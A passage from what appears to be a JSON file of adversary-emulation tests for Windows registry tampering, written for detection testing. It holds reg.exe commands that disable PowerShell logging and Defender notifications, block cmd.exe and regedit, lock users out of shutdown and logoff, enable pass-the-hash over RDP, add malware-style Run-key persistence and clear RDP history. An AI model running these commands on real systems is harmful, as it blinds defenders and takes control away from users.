"elevation_required": true}}, {"name": "Disable Windows Shutdown Button", "auto_generated_guid": "6e0d1131-2d7e-4905-8ca5-d6172f05d03d", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows shutdown button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom.msil.screenlocker.a/\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f\n", "cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Disable Windows LogOff Button", "auto_generated_guid": "e246578a-c24d-46a7-9237-0213ff86fb0c", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows logoff button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/be/threat-encyclopedia/search/js_noclose.e/2\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /t REG_DWORD /d 1 /f\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /f >nul 2>&1\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Disable Windows Change Password Feature", "auto_generated_guid": "d4a6da40-618f-454d-9a9e-26af552aaeb0", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows change password feature.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom_heartbleed.thdobah\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Disable Windows Lock Workstation Feature", "auto_generated_guid": "3dacb0d2-46ee-4c27-ac1b-f9886bf91a56", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.\nSee how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Activate Windows NoDesktop Group Policy Feature", "auto_generated_guid": "93386d41-525c-4a1b-8235-134a628dee17", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide all icons on Desktop Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Activate Windows NoRun Group Policy Feature", "auto_generated_guid": "d49ff3cc-8168-4123-b5b3-f057d9abbd55", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Run menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /f \n", "name": "command_prompt", "elevation_required": true}}, {"name": "Activate Windows NoFind Group Policy Feature", "auto_generated_guid": "ffbb407e-7f1d-4c95-b22e-548169db1fbd", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Search menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Activate Windows NoControlPanel Group Policy Feature", "auto_generated_guid": "a450e469-ba54-4de1-9deb-9023a6111690", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable Control Panel Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Activate Windows NoFileMenu Group Policy Feature", "auto_generated_guid": "5e27bdb4-7fd9-455d-a2b5-4b4b22c9dea4", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove File menu from Windows Explorer Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Activate Windows NoClose Group Policy Feature", "auto_generated_guid": "12f50e15-dbc6-478b-a801-a746e8ba1723", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable and remove the Shut Down command Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Activate Windows NoSetTaskbar Group Policy Feature", "auto_generated_guid": "d29b7faf-7355-4036-9ed3-719bd17951ed", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable changes to Taskbar and Start Menu Settings Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Activate Windows NoTrayContextMenu Group Policy Feature", "auto_generated_guid": "4d72d4b1-fa7b-4374-b423-0fe326da49d2", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable context menu for taskbar Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Activate Windows NoPropertiesMyDocuments Group Policy Feature", "auto_generated_guid": "20fc9daa-bd48-4325-9aff-81b967a84b1d", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide Properties from \"My Documents icon\" Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Hide Windows Clock Group Policy Feature", "auto_generated_guid": "8023db1e-ad06-4966-934b-b6a0ae52689e", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Hide Clock Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows HideSCAHealth Group Policy Feature", "auto_generated_guid": "a4637291-40b1-4a96-8c82-b28f1d73e54e", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove security and maintenance icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows HideSCANetwork Group Policy Feature", "auto_generated_guid": "3e757ce7-eca0-411a-9583-1c33b8508d52", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows HideSCAPower Group Policy Feature", "auto_generated_guid": "8d85a5d8-702f-436f-bc78-fcd9119496fc", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the battery icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows HideSCAVolume Group Policy Feature", "auto_generated_guid": "7f037590-b4c6-4f13-b3cc-e424c5ab8ade", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the volume icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect..\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows Modify Show Compress Color And Info Tip Registry", "auto_generated_guid": "795d3248-0394-4d4d-8e86-4e8df2a2693f", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to show compress color and show tips feature. \nSee how hermeticwiper uses this technique - https://www.splunk.com/en_us/blog/security/detecting-hermeticwiper.html\n", "supported_platforms": ["windows"], "executor": {"command": "reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f\n", "cleanup_command": "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /f >nul 2>&1\nreg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /f >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Windows Powershell Logging Disabled", "auto_generated_guid": "95b25212-91a7-42ff-9613-124aca6845a8", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable Powershell Module Logging, Script Block Logging, Transcription and Script Execution\nsee https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.PowerShell::EnableModuleLogging\n", "supported_platforms": ["windows"], "executor": {"command": "reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f\nREM do a little cleanup immediately to avoid execution issues with later tests\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /f >nul 2>&1\n", "cleanup_command": "reg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /f >nul 2>&1\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /f >nul 2>&1\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows Add Registry Value to Load Service in Safe Mode without Network", "auto_generated_guid": "1dd59fb3-1cb3-4828-805d-cf80b4c3bbb5", "description": "Modify the registry to allow a driver, service, to persist in Safe Mode.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Minimal with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode without networking. The same applies for the Network subkey.\n", "supported_platforms": ["windows"], "executor": {"command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n", "cleanup_command": "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\" /f\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows Add Registry Value to Load Service in Safe Mode with Network", "auto_generated_guid": "c173c948-65e5-499c-afbe-433722ed5bd4", "description": "Modify the registry to allow a driver, service, to persist in Safe Mode with networking.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Netowrk with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode with networking.\n", "supported_platforms": ["windows"], "executor": {"command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n", "cleanup_command": "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /f\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Disable Windows Toast Notifications", "auto_generated_guid": "003f466a-6010-4b15-803a-cbb478a314d7", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n", "supported_platforms": ["windows"], "executor": {"command": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f\n", "cleanup_command": "reg delete HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Disable Windows Security Center Notifications", "auto_generated_guid": "45914594-8df6-4ea9-b3cc-7eb9321a807e", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows security center notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n", "supported_platforms": ["windows"], "executor": {"command": "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f\n", "cleanup_command": "reg delete HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Suppress Win Defender Notifications", "auto_generated_guid": "c30dada3-7777-4590-b970-dc890b8cf113", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to suppress the windows defender notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Allow RDP Remote Assistance Feature", "auto_generated_guid": "86677d0e-0b5e-4a2b-b302-454175f9aa9e", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to allow rdp remote assistance feature. This feature allow specific\nuser to rdp connect on the targeted machine.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "NetWire RAT Registry Key Creation", "auto_generated_guid": "65704cd4-6e36-4b90-b6c1-dc29a82c8e56", "description": "NetWire continues to create its home key (HKCU\\SOFTWARE\\NetWire) as well as adding it into the auto-run group in the victim\u2019s registry.\nSee how NetWire malware - https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/\n", "supported_platforms": ["windows"], "executor": {"command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /t REG_SZ  /d \"C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe\" /f\nreg add HKCU\\SOFTWARE\\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f\nreg add HKCU\\SOFTWARE\\NetWire /v \"Install Date\" /t REG_SZ /d \"2021-08-30 07:17:27\" /f\n", "cleanup_command": "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /f >nul 2>&1\nreg delete HKCU\\SOFTWARE\\NetWire /va /f >nul 2>&1\nreg delete HKCU\\SOFTWARE\\NetWire /f >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Ursnif Malware Registry Key Creation", "auto_generated_guid": "c375558d-7c25-45e9-bd64-7b23a97c1db0", "description": "Ursnif downloads additional modules from the C&C server and saves these in the registry folder HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\Microsoft\\\nMore information - https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/\n", "supported_platforms": ["windows"], "executor": {"command": "reg add HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f\n", "cleanup_command": "reg delete HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /va /f >nul 2>&1\nreg delete HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /f >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Terminal Server Client Connection History Cleared", "auto_generated_guid": "3448824b-3c35-4a9e-a8f5-f887f68bea21", "description": "The built-in Windows Remote Desktop Connection (RDP) client (mstsc.exe) saves the remote computer name (or IP address) and the username that is used to login after each successful connection to the remote computer\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Must have the \"MR9\" Remote Desktop Connection history Key \n", "prereq_command": "if ((Get-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Default\\\").MR9) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\\" -name \"Terminal Server Client\"  -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\\" -name \"Default\" -ErrorAction Ignore\nNew-Itemproperty -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Default\" -name \"MR9\" -value \"127.0.0.1\"  -PropertyType \"String\" -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\\" -name \"Servers\" -ErrorAction Ignore\nNew-Item -path \"HKCU:\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers\" -name \"Redcanary\" -ErrorAction Ignore\n"}], "executor": {"command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Disable Windows Error Reporting Settings", "auto_generated_guid": "d2c9e41e-cd86-473d-980d-b6403562e3e1", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable windows error reporting settings. This Windows feature allow the use to report bug, errors, failure or problems \nencounter in specific application or process.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n", "supported_platforms": ["windows"], "executor": {"command": "reg add HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\n", "cleanup_command": "reg delete HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /f >nul 2>&1\nreg delete HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "DisallowRun Execution Of Certain Applications", "auto_generated_guid": "71db768a-5a9c-4047-b5e7-59e01f188e84", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to prevent user running specific computer programs that could aid them in manually removing malware or detecting it \nusing security product.\n", "supported_platforms": ["windows"], "executor": {"command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art1 /d \"regedit.exe\"\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art2 /d \"cmd.exe\"\n", "cleanup_command": "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /f >nul 2>&1\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v art1 /f >nul 2>&1\nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v art2 /f >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Enabling Restricted Admin Mode via Command_Prompt", "auto_generated_guid": "fe7974e5-5813-477b-a7bd-311d4f535e83", "description": "Enabling Restricted Admin Mode via Command_Prompt,enables an attacker to perform a pass-the-hash attack using RDP.\n\nSee [Passing the Hash with Remote Desktop](https://www.kali.org/blog/passing-hash-remote-desktop/)\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0\n", "cleanup_command": "reg delete \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Mimic Ransomware - Enable Multiple User Sessions", "auto_generated_guid": "39f1f378-ba8a-42b3-96dc-2a6540cfc1e3", "description": "This test emulates Mimic ransomware's ability to enable multiple user sessions by modifying the AllowMultipleTSSessions value within the Winlogon registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n", "supported_platforms": ["windows"], "executor": {"command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f\n", 